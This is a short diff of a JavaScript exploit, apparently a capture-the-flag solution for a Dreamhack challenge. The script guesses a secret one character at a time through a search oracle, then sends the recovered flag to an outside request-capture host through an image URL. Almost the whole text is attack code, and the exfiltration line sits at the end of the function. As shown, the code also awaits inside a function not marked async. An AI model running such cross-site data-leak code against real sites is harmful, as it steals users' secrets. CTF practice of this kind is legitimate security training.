@@ -27,18 +27,18 @@
 
     function exploit() {
 
-        let chars = "[0123456789abcdef]}"
+        let chars = "[0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',*]}"
         let secret = "DH{";
 
         while (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
-                    this.secret += c
+                    secret += c
                     break;
                 }
             }
         }
-        this.img.src = `https://owtbafv.request.dreamhack.games/${secret}`
+        img.src = `https://owtbafv.request.dreamhack.games/${secret}`
     }
 
     exploit();
